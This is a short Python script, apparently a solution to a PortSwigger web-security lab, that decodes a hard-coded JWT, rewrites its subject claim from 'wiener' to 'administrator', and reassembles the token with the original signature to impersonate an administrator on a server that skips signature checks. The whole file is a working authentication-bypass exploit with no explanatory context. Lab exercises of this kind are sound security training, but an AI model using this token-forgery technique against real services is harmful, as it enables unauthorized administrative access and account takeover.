import base64
import json

JWT = "eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoid2llbmVyIn0.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg"

header, payload, signature = JWT.split('.')

# Decode the payload
payload_decoded = json.loads(base64.urlsafe_b64decode(payload + '=='))

# Tamper the sub claim to impersonate administrator
payload_decoded['sub'] = 'administrator'

# Re-encode the payload (compact JSON, no padding)
tampered_payload = base64.urlsafe_b64encode(
    json.dumps(payload_decoded, separators=(',', ':')).encode()
).decode().rstrip('=')

# Build forged JWT keeping original header and signature untouched
forged_jwt = f"{header}.{tampered_payload}.{signature}"

print(forged_jwt)
